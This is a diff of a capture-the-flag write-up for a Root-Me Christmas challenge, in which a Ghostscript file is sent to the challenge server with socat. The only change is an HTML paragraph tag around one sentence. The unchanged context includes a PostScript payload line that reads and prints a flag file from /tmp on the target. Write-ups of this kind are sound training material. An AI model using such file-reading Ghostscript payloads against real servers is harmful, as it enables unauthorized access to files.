@@ -18,7 +18,7 @@ $ cat hello.gs | socat - TCP:dyn-01.xmas.root-me.org:PORT
 
 <p align="center"><img src="Screenshots/S3.png" alt="Desc" style="width:50%"></p>
 
-The output indicated me that the flag was located at flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt. Finally I added the line below to my payload and managed to print the flag :
+<p align="justify">The output indicated me that the flag was located at flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt. Finally I added the line below to my payload and managed to print the flag :</p>
 
 ````ghostscript
 (/tmp/flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt) (r) file 1024 string readstring pop =
